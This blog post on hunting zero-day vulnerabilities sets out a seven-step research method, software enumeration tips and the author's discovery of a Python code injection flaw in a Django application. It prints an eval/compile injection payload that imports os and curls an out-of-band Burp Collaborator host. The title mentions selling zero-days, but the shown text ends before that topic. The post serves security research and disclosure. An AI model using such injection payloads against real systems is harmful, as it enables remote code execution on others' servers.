---
layout: post
title: "From Discovery to Reward: How to Find Zero-Day Vulnerabilities, Sell Them, and Obtain CVEs"
description: "Today, we will explore a crucial topic in the world of offensive security: zero-day vulnerabilities."
date:   2024-06-11 11:01:35 +0300
image:  '/images/514.jpg'
tags:   [enumeration, exploitation, cve]
---

Hello, hackers! Today, we will explore a crucial topic in the world of offensive security: zero-day vulnerabilities. We will discuss how to conduct research to identify these vulnerabilities, methodologies to stay one step ahead, and how to sell your zero-day or request a CVE for a vulnerability.

But first, let's understand what a zero-day vulnerability is.

#### Zero-Day
A zero-day vulnerability is a flaw discovered by attackers or researchers before the vendor becomes aware of it. Since the vendors are not aware of this vulnerability, there is no patch available, making them a true lethal weapon for cyberattacks.

These vulnerabilities are highly sought after by malicious hackers because they can cause massive damage, affecting numerous companies that use the vulnerable technology. The impact can be devastating, compromising sensitive data, disrupting operations, and resulting in substantial financial losses.

### My Journey with Zero-Day Vulnerabilities
A year ago, I realized that an effective way to gain recognition and demonstrate my skills was to find zero-day vulnerabilities, as they could become CVEs attributed to me. With this in mind, I started researching methods to identify these vulnerabilities and eventually achieve my first CVEs. However, I found it challenging to find resources that guided me along this path.

I persisted, getting hands-on and using enumeration techniques to identify potential software for research. This effort resulted in my first CVEs. So far, I have obtained a total of seven, with the most critical being: [CVE-2023-2043] and [CVE-2023-2524]. Some of these vulnerabilities were also discovered through Bug Bounty programs.

### How to Find Zero-Day Vulnerabilities and How I Discovered a Critical Code Injection Vulnerability
#### Step-by-Step Process:
1. Software Enumeration: Research and identify promising software.
2. Existing Vulnerability Check: Consult databases like exploit-db and NIST to ensure the chosen software does not have cataloged vulnerabilities.
3. Environment Setup and Software Installation: Set up the testing environment on a virtual machine and install the software.
4. Testing Until Vulnerability Identification: Conduct thorough tests on the application to detect anomalous behaviors.
5. Global Technology Usage Verification: Evaluate the technological implementation to understand the potential impact of the vulnerability.
6. Report/PoC Creation: Document the vulnerability in detail and create a Proof of Concept (PoC).
7. Submission: Report the vulnerability to the developer or the responsible platform.

### Software Enumeration
To start enumerating some software, I used several research methods, such as:

* Google Search:
Examples: "download management software", "download automation software".
This helps identify popular software in various categories.

![]({{site.baseurl}}/images/700.jpg)

* GitHub:
Use specific tags and dorks to find relevant software.

![]({{site.baseurl}}/images/701.jpg)


* Mitre CVE List:
Search for types of vulnerabilities or any other keyword.
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=software

![]({{site.baseurl}}/images/702.jpg)


I focused on finding one that could be run locally via the web. After identifying a promising software, I checked for any known vulnerabilities using exploit-db and NIST. Finding no cataloged vulnerabilities, I downloaded and installed the software on my computer (I recommend using a VM to avoid compromising the host system).

### Testing and Discovery of the Vulnerability
With the application running, I began testing as in a typical web pentest. I conducted various injection attempts, including XSS and SQL Injection, and rigorously tested the application's access controls. During the normal use of the application, I carefully observed the requests made with each action.

After an intense day of testing, I noticed a parameter with suspicious values: a Python list containing specific strings. Knowing that the application used the Django framework, I started to explore this potential vulnerability more deeply. Through a series of detailed tests, I identified a critical Python Code Injection vulnerability.

> Code injection occurs when an attacker can execute arbitrary commands on the system by injecting them into a vulnerable program. This vulnerability arises when an application transmits unsafe user data (e.g., forms, cookies, and HTTP headers) to a system shell. Common scenarios include passing unsanitized input directly to system commands.
>

#### Exploitation Example:
![]({{site.baseurl}}/images/703.jpg)

To identify the vulnerability, I used a payload that imported the os library and executed a curl command pointing to my Burp Collaborator. The payload used was:

{% highlight js %}
    eval(compile("""for x in range(1):\n import os\n os.popen(r'curl http://BURPCOLLABORATOR').read()""",'','single'))
{% endhighlight %}

I injected this payload into the suspicious parameter. Upon checking the Burp Collaborator, I confirmed the receipt of the request, validating the existence of the vulnerability.

![]({{site.baseurl}}/images/704.jpg)

![]({{site.baseurl}}/images/705.jpg)